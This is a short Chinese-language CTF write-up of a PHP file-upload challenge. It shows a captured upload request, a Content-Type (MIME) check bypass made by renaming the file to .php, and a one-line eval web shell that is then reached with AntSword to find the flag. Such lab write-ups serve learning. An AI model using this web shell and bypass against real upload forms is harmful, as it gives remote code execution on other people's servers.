## php不能上傳 -> 上傳`.png` -> burpsuite抓包
```https
POST /upload.php HTTP/1.1
Host: node2.anna.nssctf.cn:xxxxx
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------4111637901xxxxxxx473098927
Content-Length: 341
Origin: http://node2.anna.nssctf.cn:xxxxx
Connection: close
Referer: http://node2.anna.nssctf.cn:xxxxx/
Cookie: PHPSESSID=7kalv8m6u81r7bb7kjxxxxxxxxxxx6
Upgrade-Insecure-Requests: 1

-----------------------------411163790122231939592473098927
Content-Disposition: form-data; name="uploaded"; filename="1.png"
Content-Type: image/png

1

-----------------------------411163790122231939592473098927
Content-Disposition: form-data; name="submit"

GoGoGo!
-----------------------------411163790122231939592473098927--

```
## 重點在第二段 -> 要改`filename=1.php`和下面改成木馬

`<?php@eval($_REQUEST["ant"]);?>` 

## *Content-Type: 改比較常見的*
```https
Content-Disposition: form-data; name="uploaded"; filename="1.php"
Content-Type: image/png

<?php
 @eval($_REQUEST["ant"]);
 ?>

```

## 用antsword來連接找到`flag.php` -> 但是假的 -> 去`phpinfo`找

|知識點||
|----|-----|
|MIME绕过|MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。|

#又是半天才做出來，卡在抓包改后缀很久
